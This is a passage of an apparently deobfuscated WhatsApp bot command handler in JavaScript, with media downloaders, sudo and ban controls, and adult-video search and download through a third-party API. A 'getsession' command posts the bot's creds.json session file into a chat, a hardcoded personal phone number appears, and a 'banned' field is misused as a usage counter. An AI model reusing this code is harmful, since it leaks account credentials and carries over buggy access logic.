					imdbInfo += `⭐ *Rating:* ${data.Rated}\n`;
					imdbInfo += `📆 *Released:* ${data.Released}\n`;
					imdbInfo += `⏳ *Duration:* ${data.Runtime}\n`;
					imdbInfo += `🌀 *Genre:* ${data.Genre}\n`;
					imdbInfo += `👨‍💼 *Director:* ${data.Director}\n`;
					imdbInfo += `✍️ *Writer:* ${data.Writer}\n`;
					imdbInfo += `👥 *Actors:* ${data.Actors}\n`;
					imdbInfo += `📖 *Plot:* ${data.Plot}\n`;
					imdbInfo += `🌐 *Language:* ${data.Language}\n`;
					imdbInfo += `🌍 *Country:* ${data.Country}\n`;
					imdbInfo += `🏆 *Awards:* ${data.Awards}\n`;
					imdbInfo += `💵 *Box Office:* ${data.BoxOffice || '-'}\n`;
					imdbInfo += `🏙️ *Production:* ${data.Production || '-'}\n`;
					imdbInfo += `🌟 *IMDb Rating:* ${data.imdbRating}\n`;
					imdbInfo += `✅ *IMDb Votes:* ${data.imdbVotes}\n`;

					await nØbødy.sendMessage(m.chat, {
						image: { url: data.Poster || 'https://via.placeholder.com/300x450?text=No+Poster' },
						caption: imdbInfo,
					}, { quoted: m });

					reply1(`✅ *Successfully displayed movie information!*`);
				} catch (err) {
					console.error(err);
					reply1(`❌ *An error occurred while searching for the movie!* 😭\n${err.message || err}`);
				}
			}
			global.db.users[m.sender].banned -= 1;
			break;
case 'ytmp4': 
			case 'ytvideo': 
			case 'ytv': {
				if (!DevOnly && global.db.users[m.sender].banned < 1) return reply1(mess.limit);
				if (!text) return reply1(`Example: ${prefix + command} https://youtu.be/videoId`);
				if (!text.includes('youtu')) return reply1(`The link you entered is not a YouTube link! 😅`);
				try {
					await reactionMessage('⏱️');
					const vidIdMatch = args[0].match(/(?:youtu\.be\/|youtube\.com\/(?:.*[?&]v=|embed\/|shorts\/|v\/))([\w-]{11})/);
					const vidId = vidIdMatch ? vidIdMatch[1] : null;
					if (!vidId) {
						return reply1(`Failed to extract video ID from the link! 😓`);
					}
					let search = await yts({ videoId: vidId, hl: 'id', gl: 'ID' });
					if (!search) return reply1(`*Video not found!* ☹️`);
					let { title, url, image } = search;
					let caption = `「 *YOUTUBE VIDEO* 」\n\n`;
					caption += `💬 Title : ${title}\n`;
					caption += `🔗 Video URL : ${url}`;
					await nØbødy.sendMessage(m.chat, {
						image: { url: image }, 
						caption: caption
					}, { quoted: m });
					let videoData = await saveTube.dl(url, args[1], 'video');
					if (!videoData || !videoData.link) {
						return reply1(`*Video not found, please retype the command or try again later! 🙏*`);
					}		
					await nØbødy.sendMessage(m.chat, { 
						video: { url: videoData.link }, 
						mimetype: 'video/mp4',
						caption: '✅ *Video successfully downloaded!*'
					}, { quoted: m });		
				} catch (err) {
					console.error(err);
					reply1(`*An error occurred!* 😭\n${err.message || err}`);
				}
				global.db.users[m.sender].banned -= 1;
				break;
			}
case 'ytaudio': 
			case 'ytmp3': {
				if (!DevOnly && global.db.users[m.sender].banned < 1) return reply1(mess.limit);
				if (!text) return reply1(`Example: ${prefix + command} https://youtu.be/videoId`);
				if (!text.includes('youtu')) return reply1(`The link you entered is not a YouTube link! 😅`);
				try {
					await reactionMessage('⏱️');		
					let search = await yts(args[0]);
					if (!search || search.all.length === 0) return reply1(`*Video not found!* ☹️`);
					let { videoId, image, title, views, duration, author, ago, url, description } = search.all[0];
					let caption = `「 *YOUTUBE AUDIO* 」\n\n`;
					caption += `🆔 ID : ${videoId}\n`;
					caption += `💬 Title : ${title}\n`;
					caption += `📺 Views : ${views}\n`;
					caption += `⏰ Duration : ${duration.timestamp}\n`;
					caption += `▶️ Channel : ${author.name}\n`;
					caption += `📆 Upload : ${ago}\n`;
					caption += `🔗 Video URL : ${url}\n`;
					caption += `📝 Description : ${description}`;
					await nØbødy.sendMessage(m.chat, {
						image: { url: image }, 
						caption: caption
					}, { quoted: m });
					let audioData = await saveTube.dl(url, args[1], 'audio');		
					if (!audioData || !audioData.link) {
						return reply1(`*Audio not found, please retype the command or try again later! 🙏*`);
					}		
					await nØbødy.sendMessage(m.chat, { 
						audio: { url: audioData.link }, 
						mimetype: 'audio/mpeg',
						fileName: `${title}.mp3`,
						ptt: true
					}, { quoted: m });
		
				} catch (err) {
					console.error(err);
					reply1(`*An error occurred!* 😭\n${err.message || err}`);
				}
				global.db.users[m.sender].banned -= 1;
				break;
			}
case 'bukalapak': {
				if (!DevOnly && global.db.users[m.sender].banned < 1) return reply1(mess.limit);
				if (!text) return reply1(`⚠️ Uh-oh, you forgot to provide a keyword! 🫣 Try typing like this: *${prefix + command} iPhone 15 Case* so Super can help find the product! 🛒✨`);
				try {
					let hasil = await BukaLapak(text);
					if (!hasil || hasil.length === 0) {
						return reply1('❌ No results found for this search, try another keyword!');
					}
					let replyText = `🛒 *Bukalapak Search Results:*\n🔍 *Keyword:* ${text}\n\n`;
					hasil.slice(0, 3).forEach((item, i) => {
						replyText += `*${i + 1}. ${item.title}*\n`;
						replyText += `💵 *Price:* ${item.harga}\n`;
						replyText += `⭐ *Rating:* ${item.rating}\n`;
						replyText += `📦 *Sold:* ${item.terjual}\n`;
						replyText += `📍 *Store Location:* ${item.store.lokasi}\n`;
						replyText += `🏬 *Store:* ${item.store.nama}\n`;
						replyText += `🛒 *Store Link:* ${item.store.link}\n`;
						replyText += `🔗 *Product Link:* ${item.link}\n\n`;
					});

					await nØbødy.sendMessage(
						m.chat,
						{
							image: { url: hasil[0].image },
							caption: `🖼️ *First Product Image:* ${hasil[0].title}`
						},
						{ quoted: m }
					);

					await nØbødy.sendMessage(
						m.chat,
						{
							text: replyText
						},
						{ quoted: m }
					);

				} catch (error) {
					console.error('Error Bukalapak:', error.response?.data || error.message);
					await reply1(`❌ An error occurred while retrieving data from Bukalapak. Please try again later!`);
				}
			}
			global.db.users[m.sender].banned -= 1;
			break;
case 'git': 
			case 'gitclone': {
				if (!DevOnly && global.db.users[m.sender].banned < 1) return reply1(mess.limit);
				if (!args[0]) return reply1(`📦 *Where's the link?*\n\nExample:\n${prefix}${command} https://github.com/user/repo`);
				if (!isUrl(args[0]) || !args[0].includes('github.com')) 
					return reply1(`❌ *Invalid link!* Make sure the link is from GitHub.`);
				try {
					await reactionMessage('⏳');
					let regex = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i;
					let [, user, repo] = args[0].match(regex) || [];
					if (!user || !repo) return reply1(`❌ *Failed to read the repository link!* Make sure the link is correct.`);
					repo = repo.replace(/.git$/, '');
					let url = `https://api.github.com/repos/${user}/${repo}/zipball`;
					let response = await fetch(url, { method: 'HEAD' });
					let filename = response.headers.get('content-disposition')?.match(/attachment; filename=(.*)/)?.[1] || `${repo}.zip`;
					await nØbødy.sendMessage(m.chat, {
						document: { url: url },
						fileName: filename,
						mimetype: 'application/zip'
					}, { 
						quoted: m 
					});
					reply1(`✅ *Successfully sent the GitHub repository file!*\nFile Name: ${filename}`);
				} catch (err) {
					console.error(err);
					reply1(`❌ *An error occurred while downloading the repository!* 😭\n${err.message || err}`);
					}
				global.db.users[m.sender].banned -= 1;
			}
			break;
case 'githubstalk': {
				if (!DevOnly && global.db.users[m.sender].banned < 1) return reply1(mess.limit);
				if (!text) return reply1(`⚠️ Use it like this: ${prefix + command} *GitHub username*\n\n🤔 *Example:*\n\n${prefix + command} SuperAI`);
				try {
					const userInfo = await githubstalk(text);
					console.log(userInfo);
					reply1(`🧑‍💻 *Username:* ${userInfo.username || 'Anonymous'}\n🌟 *Nickname:* ${userInfo.nickname || 'Anonymous'}\n📝 *Bio:* ${userInfo.bio || 'Not available'}\n🆔 *ID:* ${userInfo.id}\n🔑 *NodeID:* ${userInfo.nodeId}\n🔗 *URL:* ${userInfo.url}\n🏷️ *Type:* ${userInfo.type}\n👑 *Admin:* ${userInfo.admin ? 'Yes' : 'No'}\n🏢 *Company:* ${userInfo.company || 'None'}\n🌐 *Blog:* ${userInfo.blog || 'None'}\n📍 *Location:* ${userInfo.location || 'Unknown'}\n📧 *Email:* ${userInfo.email || 'Not available'}\n📚 *Public Repos:* ${userInfo.public_repo}\n🎁 *Public Gists:* ${userInfo.public_gists}\n👥 *Followers:* ${userInfo.followers}\n➕ *Following:* ${userInfo.following}\n🕰️ *Created At:* ${userInfo.created_at}\n🔄 *Updated At:* ${userInfo.updated_at}`);
				} catch (err) {
					console.error(err);
					reply1(`❌ There was a problem retrieving GitHub data! Please try again later 🥺`);
				}
			}
			global.db.users[m.sender].banned -= 1;
			break;	
  case "mode":
{
    if (m.isGroup) {
        if (global.db.groups[m.chat].banned) {
            return;
        }
    }
    if (global.db.users[m.sender].banned) {
        return m.reply(mess.ban);
    }
    if (!DevOnly) {
        return m.reply(mess.owner);
    }

    const modeType = args[0]; // Assuming _0x56c060 is the arguments array

    if (modeType === "public") {
        if (global.db.settings.mode) {
            m.reply("Bot mode is already set to Public!");
        } else {
            global.db.settings.mode = true;
            m.reply("Bot mode changed to Public!");
        }
    } 
    else if (modeType === "private") {
        if (!global.db.settings.mode) {
            m.reply("Bot mode is already set to Private!");
        } else {
            nØbødy.public = false; // Assuming _0x112728 was for bot settings
            global.db.settings.mode = false;
            m.reply("Bot mode changed to Private!");
        }
    } 
    else if (modeType === "group") {
        if (global.db.settings.onlygroup) {
            m.reply("Already activated!");
        } else {
            global.db.settings.onlygroup = true;
            global.db.settings.onlypc = false;
            m.reply("Only group mode activated!");
        }
    } 
    else if (modeType === "pc") {
        if (global.db.settings.onlypc) {
            m.reply("Already activated!");
        } else {
            global.db.settings.onlypc = true;
            global.db.settings.onlygroup = false;
            m.reply("Only PC mode activated!");
        }
    } 
    else if (modeType === "off") {
        global.db.settings.onlypc = false;
        global.db.settings.onlygroup = false;
        await m.reply("Successfully deactivated only PC / only group mode.");
    } 
    else {
        m.reply("Invalid mode! Choose from: public/private/group/pc/off");
    }
}
break;
// REMINI CASE

case 'remini': case 'hd': case 'upscale': {

			if (!quoted) return reply1(`*𝚁𝚎𝚙𝚕𝚢 𝚃𝚘 𝚊 𝙼𝚎𝚍𝚒𝚊 𝙼𝚊𝚗!!!*`)

			if (!/image/.test(mime)) return reply1(`*𝚁𝚎𝚙𝚕𝚢 𝚝𝚘 𝙿𝚑𝚘𝚝𝚘!!*`)

			reply1(`𝐖𝐚𝐢𝐭`)

			let media = await quoted.download()

			let proses = await remini(media, "enhance");

			await nØbødy.sendMessage(m.chat, {

				image: proses,

				caption: "𝐃𝐨𝐧𝐞 𝐂𝐡𝐚𝐧𝐠𝐢𝐧𝐠 𝐑𝐞𝐬𝐨𝐥𝐮𝐭𝐢𝐨𝐧 𝐓𝐨 𝐔𝐥𝐭𝐫𝐚"

			}, {

				quoted: ctt

			})

		}

		break
case "welcome":
    {
        // Check if the command is used in a group
        if (m.isGroup) {
            // If the group is banned, ignore the command
            if (global.db.groups[m.chat].banned) {
                return;
            }
        }

        // If the user is banned, reply with the ban message
        if (global.db.users[m.sender].banned) {
            return m.reply(mess.ban);
        }

        // Ensure the command is used in a group
        if (!m.isGroup) {
            return m.reply(mess.group);
        }

        // Check if the user is an admin or has special privileges
        if (!m.isAdmin && !DevOnly) {
            return m.reply(mess.admin);
        }

        // Ensure the bot is an admin
        if (!m.isBotAdmin) {
            return m.reply(mess.botAdmin);
        }

        // Ensure the command has an argument (on/off)
        if (args.length < 1) {
            return m.reply("Usage: welcome on/off");
        }

        // Turn welcome messages on or off
        if (args[0] === "on") {
            if (global.db.groups[m.chat].welcome) {
                return m.reply("Welcome messages are already enabled.");
            }
            global.db.groups[m.chat].welcome = true;
            m.reply("Welcome messages have been enabled.");
        } else if (args[0] === "off") {
            if (!global.db.groups[m.chat].welcome) {
                return m.reply("Welcome messages are already disabled.");
            }
            global.db.groups[m.chat].welcome = false;
            m.reply("Welcome messages have been disabled.");
        }
    }
    break;

case "goodbye":
    {
        // Check if the command is used in a group
        if (m.isGroup) {
            // If the group is banned, ignore the command
            if (global.db.groups[m.chat].banned) {
                return;
            }
        }

        // If the user is banned, reply with the ban message
        if (global.db.users[m.sender].banned) {
            return m.reply(mess.ban);
        }

        // Ensure the command is used in a group
        if (!m.isGroup) {
            return m.reply(mess.group);
        }

        // Check if the user is an admin or has special privileges
        if (!m.isAdmin && !DevOnly) {
            return m.reply(mess.admin);
        }

        // Ensure the bot is an admin
        if (!m.isBotAdmin) {
            return m.reply(mess.botAdmin);
        }

        // Ensure the command has an argument (on/off)
        if (args.length < 1) {
            return m.reply("Usage: goodbye on/off");
        }

        // Turn goodbye messages on or off
        if (args[0] === "on") {
            if (global.db.groups[m.chat].goodbye) {
                return m.reply("Goodbye messages are already enabled.");
            }
            global.db.groups[m.chat].goodbye = true;
            m.reply("Goodbye messages have been enabled.");
        } else if (args[0] === "off") {
            if (!global.db.groups[m.chat].goodbye) {
                return m.reply("Goodbye messages are already disabled.");
            }
            global.db.groups[m.chat].goodbye = false;
            m.reply("Goodbye messages have been disabled.");
        }
    }
    break;
case "addsudo":
case "setsudo":
    {
        // Check if the command is used in a group and if the group is banned
        if (m.isGroup) {
            if (global.db.groups[m.chat].banned) {
                return;
            }
        }

        // If the user is banned, prevent execution
        if (global.db.users[m.sender].banned) {
            return m.reply(mess.ban);
        }

        // Ensure the command is used by the owner
        if (!DevOnly) {
            return m.reply(mess.owner);
        }

        // Check if the command has a mentioned user, a quoted message, or a direct number input
        if (m.qouted || text) {
            let targetUser = m.mentionedJid[0] 
                ? m.mentionedJid[0] 
                : text 
                    ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" 
                    : m.qouted 
                        ? m.qouted.sender 
                        : "";

            // If the user is already in the sudo list, return an error message
            if (setsudo.includes(targetUser)) {
                return m.reply(`User ${targetUser.split("@")[0]} is already a sudo user.`);
            }

            // Add the user to the sudo list
            await setsudo.push(targetUser);
            await fs.writeFileSync("./library/database/setsudo.json", JSON.stringify(setsudo));

            m.reply(`Successfully added ${targetUser.split("@")[0]} as a sudo user.`);
        } else {
            return m.reply("Usage: /@tag / 234XXX / reply to a message to add to sudo list.");
        }
    }
    break; 
case "delsudo":
case "removesudo":
    {
        // Check if the command is used in a group and if the group is banned
        if (m.isGroup) {
            if (global.db.groups[m.chat].banned) {
                return;
            }
        }

        // If the user is banned, prevent execution
        if (global.db.users[m.sender].banned) {
            return m.reply(mess.ban);
        }

        // Ensure the command is used by the owner
        if (!DevOnly) {
            return m.reply(mess.owner);
        }

        // Check if the command has a mentioned user, a quoted message, or a direct number input
        if (m.qouted || text) {
            let targetUser = m.mentionedJid[0] 
                ? m.mentionedJid[0] 
                : text 
                    ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" 
                    : m.qouted 
                        ? m.qouted.sender 
                        : "";

            // If the user is not found in the sudo list, return an error message
            if (!setsudo.includes(targetUser)) {
                return m.reply(`User ${targetUser.split("@")[0]} was not found in the sudo list.`);
            }

            // Remove the user from the sudo list
            let userIndex = setsudo.indexOf(targetUser);
            await setsudo.splice(userIndex, 1);
            await fs.writeFileSync("./library/database/setsudo.json", JSON.stringify(setsudo));

            m.reply(`Successfully removed ${targetUser.split("@")[0]} from the sudo list.`);
        } else {
            return m.reply("Usage: @tag / 234XXX / reply to a message to remove from sudo list.");
        }
    }
    break;

case "listsudo":
case "getsudo":
    {
        // Check if the command is used in a group and if the group is banned
        if (m.isGroup) {
            if (global.db.groups[m.chat].banned) {
                return;
            }
        }

        // If the user is banned, prevent execution
        if (global.db.users[m.sender].banned) {
            return m.reply(mess.ban);
        }

        // Ensure the command is used by the owner
        if (!DevOnly) {
            return m.reply(mess.owner);
        }

        // If there are no sudo users, notify the user
        if (setsudo.length < 1) {
            return m.reply("No sudo users have been added yet.");
        }

        // Construct a list of sudo users
        let sudoMessage = "Sudo Users:\n";
        setsudo.forEach(user => {
            sudoMessage += `* @${user.split("@")[0]}\n`;
        });

        // Send the sudo list as a message
        await nØbødy.sendMessage(m.chat, {
            text: sudoMessage,
            mentions: [...setsudo]
        }, { quoted: m });
    }
    break;
case "setalive":
    {
        // Check if the command is used in a group and if the group is banned
        if (m.isGroup) {
            if (global.db.groups[m.chat].banned) {
                return;
            }
        }

        // If the user is banned, prevent execution
        if (global.db.users[m.sender].banned) {
            return m.reply(mess.ban);
        }

        // Ensure only the developer can execute the command
        if (!DevOnly) {
            return m.reply(mess.owner);
        }

        // Ensure there is a message to set
        if (!args[0]) {
            return m.reply("Please provide a message.");
        }

        // Save the alive message
        const aliveMessage = args.join(" ");
        global.db.settings.alive = aliveMessage;

        m.reply("Alive message set!");
    }
    break;

case "img":
case "pin":
    {
        // Ensure a search query is provided
        if (!args[0]) {
            return m.reply("Please provide a search query.");
        }

        try {
            let searchResults = await pinterest(args.join(" ")); // Function to fetch images
            let caption = `乂 *P I N T E R E S T - S E A R C H*\n\n© ѕυρєя м∂ ${args.join(" ")}`;

            let images = searchResults.map(url => ({
                image: { url },
                caption
            }));

            // Send images one by one
            for (let img of images) {
                nØbødy.sendMessage(m.chat, img, { quoted: m });
            }
        } catch (error) {
            m.reply(error.toString());
        }
    }
    break;
case "download":
case "save":
case "sv":
    {
        // Check if the command is used in a group and if the group is banned
        if (m.isGroup) {
            if (global.db.groups[m.chat].banned) {
                return;
            }
        }

        // If the user is banned, prevent execution
        if (global.db.users[m.sender].banned) {
            return m.reply(mess.ban);
        }

        // Ensure only the developer can execute the command
        if (!DevOnly) {
            return;
        }

        try {
            const quotedMessage = m.msg.contextInfo.quotedMessage;
            
            if (quotedMessage) {
                // If the quoted message contains an image
                if (quotedMessage.imageMessage) {
                    let caption = quotedMessage.imageMessage.caption || "";
                    let filePath = await nØbødy.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
                    
                    nØbødy.sendMessage(m.chat, {
                        image: { url: filePath },
                        caption
                    });
                }

                // If the quoted message contains a video
                if (quotedMessage.videoMessage) {
                    let caption = quotedMessage.videoMessage.caption || "";
                    let filePath = await nØbødy.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
                    
                    nØbødy.sendMessage(m.chat, {
                        video: { url: filePath },
                        caption
                    });
                }
            }
        } catch (error) {
            console.error("Error in 'download' command:", error);
        }
    }
    break;

case "unbanchat":
case "unbangc":
    {
        // Ensure the command is used in a group
        if (!m.isGroup) {
            return m.reply(mess.group);
        }

        // Ensure only the developer can execute the command
        if (!DevOnly) {
            return m.reply(mess.owner);
        }

        // Initialize group database if it doesn't exist
        if (!global.db.groups[m.chat]) {
            global.db.groups[m.chat] = {};
        }

        // Check if the group is already unbanned
        if (global.db.groups[m.chat].banned === false) {
            return m.reply("This group is not banned from using bot commands!");
        }

        // Unban the group
        global.db.groups[m.chat].banned = false;
        m.reply(`Ban group feature disabled. ${botname} can now be used here!`);
    }
    break;
case "ban":
    {
        // Ensure only the developer can execute the command
        if (!DevOnly) {
            return m.reply(mess.owner);
        }

        let creatorID = "2347036214381"; // Bot creator's number
        let targetUser = m.mentionedJid[0] || (m.quoted ? m.quoted.sender : "");

        if (!targetUser) {
            return m.reply("Reply or tag a user!");
        }

        if (targetUser === botNumber) {
            return m.reply("I cannot ban myself!");
        }

        if (targetUser === creatorID + "@s.whatsapp.net") {
            return m.reply("I cannot ban my Creator!");
        }

        if (!global.db.users[targetUser]) {
            global.db.users[targetUser] = {};
        }

        if (global.db.users[targetUser].banned) {
            return m.reply(`User @${targetUser.split("@")[0]} is already banned!`);
        }

        global.db.users[targetUser].banned = true;
        m.reply(`User @${targetUser.split("@")[0]} has been banned from using bot commands!`);
    }
    break;

case "unban":
    {
        // Ensure only the developer can execute the command
        if (!DevOnly) {
            return m.reply(mess.owner);
        }

        let targetUser = m.mentionedJid[0] || (m.quoted ? m.quoted.sender : "");

        if (!targetUser) {
            return m.reply("Reply or tag a user!");
        }

        if (!global.db.users[targetUser]) {
            global.db.users[targetUser] = {};
        }

        if (!global.db.users[targetUser].banned) {
            return m.reply(`User @${targetUser.split("@")[0]} is not banned!`);
        }

        global.db.users[targetUser].banned = false;
        m.reply(`User @${targetUser.split("@")[0]} has been unbanned and can now use the bot!`);
    }
    break;

case "say":
case "tts":
case "gtts":
    {
        // Check if the command is used in a banned group
        if (m.isGroup && global.db.groups[m.chat].banned) {
            return;
        }

        // If the user is banned, prevent execution
        if (global.db.users[m.sender].banned) {
            return m.reply(mess.ban);
        }

        // Ensure the user provides text input
        if (!args) {
            return m.reply("Please provide the text to convert into speech.");
        }

        let text = args;
        const ttsUrl = googleTTS.getAudioUrl(text, {
            lang: "en",
            slow: false,
            host: "https://translate.google.com"
        });

        return nØbødy.sendMessage(m.chat, {
            audio: { url: ttsUrl },
            mimetype: "audio/mp4",
            ptt: true,
            fileName: text + ".mp3"
        }, { quoted: m });
    }
    break;
case "banchat":
case "bangc":
    {
        // Ensure the command is used in a group
        if (!m.isGroup) {
            return m.reply(mess.group);
        }

        // Ensure only the developer can execute the command
        if (!DevOnly) {
            return m.reply(mess.owner);
        }

        // Initialize group database if not set
        if (!global.db.groups[m.chat]) {
            global.db.groups[m.chat] = {};
        }

        // Check if the group is already banned
        if (global.db.groups[m.chat].banned === true) {
            return m.reply("This group has already been banned from using bot commands!");
        }

        // Ban the group
        global.db.groups[m.chat].banned = true;
        m.reply(`Ban group feature enabled! ${botname} won't work here anymore.`);
    }
    break;

case "antidelete":
    {
        // Check if the command is used in a banned group
        if (m.isGroup && global.db.groups[m.chat].banned) {
            return;
        }

        // If the user is banned, prevent execution
        if (global.db.users[m.sender].banned) {
            return m.reply(mess.ban);
        }

        // Ensure only the developer can execute the command
        if (!DevOnly) {
            return m.reply(mess.owner);
        }

        let option = args[0]; // First argument provided by the user

        if (option === "g") {
            if (global.db.settings.antidelete) {
                return m.reply("Anti-delete is already enabled for groups!");
            }
            global.db.settings.antidelete = true;
            m.reply("Anti-delete enabled for groups!");
        } else if (option === "p") {
            if (global.db.settings.antidelete2) {
                return m.reply("Anti-delete is already enabled for private chats!");
            }
            global.db.settings.antidelete2 = true;
            m.reply("Anti-delete enabled for private chats!");
        } else if (option === "off") {
            global.db.settings.antidelete = false;
            global.db.settings.antidelete2 = false;
            m.reply("Anti-delete has been disabled!");
        } else {
            m.reply("Usage: antidelete <g/p/off>");
        }
    }
    break;
case "getdevice":
case "device":
case "phone":
  {
    // If used in a group, check if the group is banned
    if (m.isGroup) {
      if (global.db.groups[m.chat].banned) {
        return;
      }
    }

    // Check if the user is banned
    if (global.db.users[m.sender].banned) {
      return m.reply(mess.ban);
    }

    // Ensure a quoted message exists
    if (!m.quoted) {
      return m.reply(usage("reply to a chat"));
    }

    // Retrieve the device info for the quoted message sender
    const deviceInfo = await getDevice(m.quoted.id);
    await nØbødy.sendMessage(m.chat, {
      text: "@" + m.quoted.sender.split("@")[0] + " is using " + deviceInfo
    }, { quoted: m });
  }
  break; 
case "xvideosearch":
{
    // Check if command is used in a group and if the group is banned
    if (m.isGroup) {
        if (global.db.groups[m.chat].banned) {
            return;
        }
    }

    // Check if the user is banned
    if (global.db.users[m.sender].banned) {
        return m.reply(mess.ban);
    }

    // Check if a search query was provided
    if (!text) {
        return m.reply(getRandomKeyword("Milf"));
    }

    try {
        // Fetch search results from API
        let response = await fetch(`https://api.agatz.xyz/api/xvideo?message=${encodeURIComponent(text)}`);
        let result = await response.json();

        // Check if the API returned valid results
        if (result.status !== 200 || !result.data || result.data.length === 0) {
            throw "No videos found for this keyword.";
        }

        // Format the search results
        let searchResults = `*Super xvideo search result*\n\n *"${text}"*:\n`;
        result.data.forEach(video => {
            searchResults += `Title: ${video.title || "no name"}\n`;
            searchResults += `  Duration: ${video.duration || "no duration"}\n`;
            searchResults += `  URL: ${video.url || "no URL"}\n`;
            searchResults += `  Thumbnail: ${video.thumb || "no thumbnail"}\n\n`;
        });

        // Send the search results
        await nØbødy.sendMessage(m.chat, { text: searchResults });
    } catch (error) {
        await nØbødy.sendMessage(m.chat, "Can't fetch result from query.");
    }
}
break;

case "xnxxsearch":
{
    // Check if command is used in a group and if the group is banned
    if (m.isGroup) {
        if (global.db.groups[m.chat].banned) {
            return;
        }
    }

    // Check if the user is banned
    if (global.db.users[m.sender].banned) {
        return m.reply(mess.ban);
    }

    // Check if a search query was provided
    if (!text) {
        return m.reply(getRandomKeyword("stepmoms"));
    }

    try {
        // Fetch search results from API
        let response = await fetch(`https://api.agatz.xyz/api/xnxx?message=${text}`);
        let result = await response.json();

        // Check if the API returned valid results
        if (result.status !== 200) {
            throw `API Error: ${result.creator}`;
        }

        // Format the search results
        let searchResults = "";
        result.data.result.forEach(video => {
            searchResults += `• Title: *${video.title}*\n`;
            searchResults += `• Info: *${video.info}*\n`;
            searchResults += `• Link: *${video.link}*\n\n`;
        });

        // Send the search results
        await nØbødy.sendMessage(m.chat, { text: searchResults });
    } catch (error) {
        await nØbødy.sendMessage(m.chat, "Can't fetch result from query.");
    }
}
break; 
case "listblock":
case "listblocked":
    {
        // Check if the command is used in a group and if the group is banned
        if (m.isGroup) {
            if (global.db.groups[m.chat].banned) {
                return;
            }
        }

        // Check if the user is banned
        if (global.db.users[m.sender].banned) {
            return m.reply(mess.ban);
        }

        // Check if the command is allowed only for the developer (DevOnly)
        if (!DevOnly) {
            return m.reply(mess.owner);
        }

        // Fetch the blocklist and check if there are any blocked users
        let blocklist = await nØbødy.fetchBlocklist();
        if (blocklist.length === 0) {
            m.reply("No blocked users found.");
        } else {
            // Create a formatted list of blocked users
            let blockedUsers = blocklist.map((user, index) => (index + 1) + ". @" + user.replace(/@.+/, "")).join("\n");
            await m.reply("Blocked contacts:\n" + ("Total: " + blocklist.length + " blocked\n") + blockedUsers);
        }
    }
    break;

case "runtime":
    {
        // Check if the command is used in a group and if the group is banned
        if (m.isGroup) {
            if (global.db.groups[m.chat].banned) {
                return;
            }
        }

        // Check if the user is banned
        if (global.db.users[m.sender].banned) {
            return m.reply(mess.ban);
        }

        // Calculate and reply with the bot's runtime
        let botRuntime = botname + " bot has been active for:\n" + runtime(process.uptime());
        await m.reply(botRuntime);
    }
    break;
case "getsession":
    {
        // Check if the command is used in a group and if the group is banned
        if (m.isGroup && global.db.groups[m.chat].banned) {
            return;
        }

        // Check if the user is banned
        if (global.db.users[m.sender].banned) {
            return m.reply(mess.ban);
        }

        // Check if the command is allowed only for the developer (DevOnly)
        if (!DevOnly) {
            return m.reply(mess.owner);
        }

        // Notify that the session file retrieval is in process
        await m.reply("Wait a moment, currently retrieving your session file");

        // Read the session file (creds.json)
        let sessionFile = await fs.readFileSync("./session/creds.json");

        // Send the session file (creds.json) to the chat
        await nØbødy.sendMessage(m.chat, {
            document: sessionFile,
            mimetype: "application/json",
            fileName: "creds.json"
        }, {
            quoted: m
        });
    }
    break;
case "xvideodl":
    {
        // Check if the command is used in a group and if the group is banned
        if (m.isGroup && global.db.groups[m.chat].banned) {
            return;
        }

        // Check if the user is banned
        if (global.db.users[m.sender].banned) {
            return m.reply(mess.ban);
        }

        // Ensure a link is provided
        if (!text) {
            return m.reply(mess.linkRequired);
        }

        // Check if the provided link is from xvideos.com
        if (!text.includes("xvideos.com")) {
            return m.reply("Link is not from xvideos.com");
        }

        // Show a loading reaction while processing the download
        await nØbødy.sendMessage(m.chat, {
            react: {
                text: "⏳",
                key: m.key
            }
        });

        try {
            // Fetch the download data from the API
            let response = await fetch("https://api.agatz.xyz/api/xvideodown?url=" + encodeURIComponent(text));
            let data = await response.json();

            // Check if the response is successful and contains the video data
            if (data.status !== 200 || !data.data) {
                throw "Cannot find video for this URL.";
            }

            // Extract the video URL and fetch it
            let videoData = data.data;
            const videoUrl = videoData.url;
            const videoFetch = await fetch(videoUrl);

            if (!videoFetch.ok) {
                throw "Failed to download video.";
            }

            // Send the video to the chat
            await nØbødy.sendMessage(m.chat, {
                video: {
                    url: videoUrl
                },
                caption: "**Title:** " + (videoData.title || "No title") + "\n" +
                         ("**Views:** " + (videoData.views || "No view information")) + "\n" +
                         ("**Votes:** " + (videoData.vote || "No vote information")) + "\n" +
                         ("**Likes:** " + (videoData.like_count || "No like information")) + "\n" +
                         ("**Dislikes:** " + (videoData.dislike_count || "No dislike information"))
            });

            // Remove the loading reaction
            await nØbødy.sendMessage(m.chat, {
                react: {
                    text: "",
                    key: m.key
                }
            });
        } catch (error) {
            console.log("Error downloading video: " + error);
        }
    }
    break;
case "warn":
    {
        // Check if the command is used in a group and if the group is banned
        if (m.isGroup && global.db.groups[m.chat].banned) {
            return;
        }

        // Check if the user is banned
        if (global.db.users[m.sender].banned) {
            return m.reply(mess.ban);
        }

        // Determine the user to warn: mentioned, quoted, or based on the text
        const targetUser = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false;

        // Ensure the command is executed in a group
        if (!m.isGroup) {
            return m.reply(mess.group);
        }

        // Ensure the user has admin rights
        if (!m.isAdmin) {
            return m.reply(mess.admin);
        }

        // Ensure the bot has admin rights
        if (!m.isBotAdmin) {
            return m.reply(mess.botAdmin);
        }

        // Ensure a target user is specified
        if (!targetUser) {
            return m.reply("Tag or reply to the user you want to warn!");
        }

        // Check if the target user exists in the database, otherwise initialize with 4 warnings
        if (!global.db.users[targetUser]) {
            global.db.users[targetUser] = {
                warn: 4
            };
        }

        let warningCount = global.db.users[targetUser].warn;

        // Process warnings
        if (warningCount === 4) {
            global.db.users[targetUser].warn = 3;
            m.reply("⚠️ Warning for " + targetUser.replace("@s.whatsapp.net", "") + "!\nYou have 3 warnings left before the bot takes action.");
        } else if (warningCount === 3) {
            global.db.users[targetUser].warn = 2;
            m.reply("⚠️ Warning for " + targetUser.replace("@s.whatsapp.net", "") + "!\nYou have 2 warnings left before the bot takes action.");
        } else if (warningCount === 2) {
            global.db.users[targetUser].warn = 1;
